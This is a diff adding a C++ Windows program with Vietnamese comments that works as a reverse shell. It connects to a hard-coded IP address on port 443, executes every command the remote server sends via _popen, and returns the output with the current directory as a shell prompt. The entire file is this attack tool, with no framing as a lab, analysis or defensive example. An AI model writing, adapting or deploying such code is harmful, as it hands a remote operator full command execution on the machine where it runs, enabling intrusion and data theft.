@@ -1,0 +1,114 @@
+#include <iostream>
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <cstdio>
+#include <cstring>
+#include <shlwapi.h>
+
+using namespace std;
+#pragma comment(lib, "ws2_32.lib")
+
+const int PORT = 443;
+const char* SERVER_IP = "10.4.1.72";
+const int BUFFER_SIZE = 1024;
+
+string exec(const char* cmd) {
+    char buffer[BUFFER_SIZE];
+    string result = "";
+    FILE* pipe = _popen(cmd, "r");
+    if (!pipe) return "Error executing command.";
+    while (!feof(pipe)) {
+        if (fgets(buffer, BUFFER_SIZE, pipe) != NULL)
+            result += buffer;
+    }
+    _pclose(pipe);
+    return result;
+}
+
+
+int main() {
+    WSADATA wsaData;
+    SOCKET clientSocket = INVALID_SOCKET;
+    struct sockaddr_in serverAddr;
+    int iResult;
+
+    // Khởi tạo Winsock
+    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0) {
+        cerr << "WSAStartup failed: " << iResult << std::endl;
+        return 1;
+    }
+
+    // Tạo socket
+    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (clientSocket == INVALID_SOCKET) {
+        cerr << "Error in socket creation." << std::endl;
+        WSACleanup();
+        return 1;
+    }
+
+    // Thiết lập thông tin của máy chủ
+    serverAddr.sin_family = AF_INET;
+    serverAddr.sin_port = htons(PORT);
+    inet_pton(AF_INET, SERVER_IP, &serverAddr.sin_addr);
+
+    // Kết nối đến máy chủ
+    iResult = connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
+    if (iResult == SOCKET_ERROR) {
+        cerr << "Error in connection." << std::endl;
+        closesocket(clientSocket);
+        WSACleanup();
+        return 1;
+    }
+
+    char buffer[BUFFER_SIZE];
+
+    while (true) {
+        iResult = recv(clientSocket, buffer, sizeof(buffer), 0);
+        if (iResult == SOCKET_ERROR) {
+            cerr << "Error in receiving data." << std::endl;
+            break;
+        }
+        if (iResult == 0) {
+            cout << "Server closed connection." << std::endl;
+            break;
+        }
+        buffer[iResult] = '\0';
+        cout << "Received from server: " << buffer << std::endl;
+
+        if (strcmp(buffer, "exit") == 0) {
+            cout << "Received exit command. Closing connection." << endl;
+            break;
+        }
+
+        constexpr DWORD bufferSize = MAX_PATH; 
+        TCHAR bufferDir[bufferSize]; 
+
+        DWORD result = GetCurrentDirectory(bufferSize, bufferDir); 
+
+        if (result == 0) {
+            // Lỗi xảy ra
+            std::cerr << "Error getting current directory. Error code: " << GetLastError() << std::endl;
+            return 1;
+        }
+
+        // Chuyển đổi bufferDir sang chuỗi string
+        wstring currentDirWide(bufferDir);
+        string currentDir(currentDirWide.begin(), currentDirWide.end());
+        string cmdOutput = exec(buffer) + "\n" + currentDir + "> ";
+        const char* message = cmdOutput.c_str();
+        iResult = send(clientSocket, message, strlen(message), 0);
+        if (iResult == SOCKET_ERROR) {
+            std::cerr << "Error in sending data." << std::endl;
+            closesocket(clientSocket);
+            WSACleanup();
+            return 1;
+        }
+    }
+
+    // Đóng kết nối
+    closesocket(clientSocket);
+    WSACleanup();
+
+    return 0;
+}
